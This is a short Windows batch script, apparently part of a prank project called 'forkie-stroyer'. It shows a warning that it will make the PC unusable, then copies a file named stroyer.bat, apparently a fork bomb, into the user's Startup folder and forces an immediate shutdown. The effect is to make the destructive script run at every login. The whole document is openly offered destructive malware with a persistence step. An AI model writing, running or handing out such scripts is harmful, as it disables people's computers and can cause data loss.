@echo off
echo WARNING THIS WILL MAKE THE PC UNUSABLE
pause
echo you asked for it m8
copy "%USERPROFILE%\Downloads\forkie-stroyer.zip\forkie-stroyer-main\stroyer.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
shutdown -s -t -0
